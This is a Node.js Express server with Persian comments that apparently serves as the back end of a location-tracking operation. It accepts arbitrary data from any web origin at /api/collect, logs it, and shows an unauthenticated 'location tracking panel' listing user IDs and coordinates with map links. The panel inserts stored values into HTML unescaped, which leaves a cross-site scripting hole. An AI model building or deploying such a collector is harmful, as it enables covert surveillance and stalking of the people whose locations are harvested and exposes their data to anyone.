const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// ===== CORS =====
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// ===== پذیرش داده با حجم بالا =====
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

// ===== سرو فایل‌های استاتیک =====
app.use(express.static('public'));

// ===== مسیر دریافت داده =====
app.post('/api/collect', (req, res) => {
    try {
        const data = req.body;
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `data_${timestamp}.json`;

        const logDir = path.join(__dirname, 'logs');
        if (!fs.existsSync(logDir)) fs.mkdirSync(logDir);

        // ذخیره فایل مجزا
        fs.writeFileSync(path.join(logDir, filename), JSON.stringify(data, null, 2));

        // ذخیره در فایل جمع‌کننده
        const logFile = path.join(logDir, 'all_data.jsonl');
        fs.appendFileSync(logFile, JSON.stringify(data) + '\n');

        console.log(`[+] Data received: ${filename}`);
        res.json({ status: 'success', message: 'Data saved' });
    } catch (err) {
        console.error('Error saving data:', err);
        res.status(500).json({ status: 'error', message: err.message });
    }
});

// ===== پنل مدیریت (همان نسخه قبلی) =====
app.get('/panel', (req, res) => {
    const logFile = path.join(__dirname, 'logs', 'all_data.jsonl');
    let latestData = [];
    if (fs.existsSync(logFile)) {
        const lines = fs.readFileSync(logFile, 'utf-8').split('\n').filter(Boolean);
        const lastLines = lines.slice(-30);
        latestData = lastLines.map(line => {
            try { return JSON.parse(line); } catch { return null; }
        }).filter(Boolean);
    }

    let html = `
        <!DOCTYPE html>
        <html>
        <head><title>پنل مدیریت</title><meta charset="UTF-8"><meta http-equiv="refresh" content="10">
        <style>
            body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
            .entry { background: #1a1a1a; padding: 15px; border-radius: 8px; margin-bottom: 15px; border-left: 3px solid #0f0; }
            .time { color: #ff0; } .user { color: #0ff; } .coords { color: #f0f; }
            a { color: #0ff; }
        </style>
        </head>
        <body>
            <h1>📍 پنل ردیابی موقعیت</h1>
            <p>تعداد ورودی‌ها: ${latestData.length}</p>
    `;

    latestData.forEach(entry => {
        const time = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : 'نامشخص';
        const user = entry.userId || 'نامشخص';
        const lat = entry.location?.latitude || 'نامشخص';
        const lng = entry.location?.longitude || 'نامشخص';
        html += `
            <div class="entry">
                <p class="time">⏱️ ${time}</p>
                <p class="user">👤 کاربر: ${user}</p>
                <p class="coords">🌐 موقعیت: ${lat}, ${lng}</p>
                <p><a href="https://maps.google.com/maps?q=${lat},${lng}" target="_blank">📍 نمایش روی نقشه</a></p>
            </div>
        `;
    });

    html += `</body></html>`;
    res.send(html);
});

// ===== راه‌اندازی =====
app.listen(port, '0.0.0.0', () => {
    console.log(`[+] Server running on port ${port}`);
    console.log(`[+] Panel: http://localhost:${port}/panel`);
});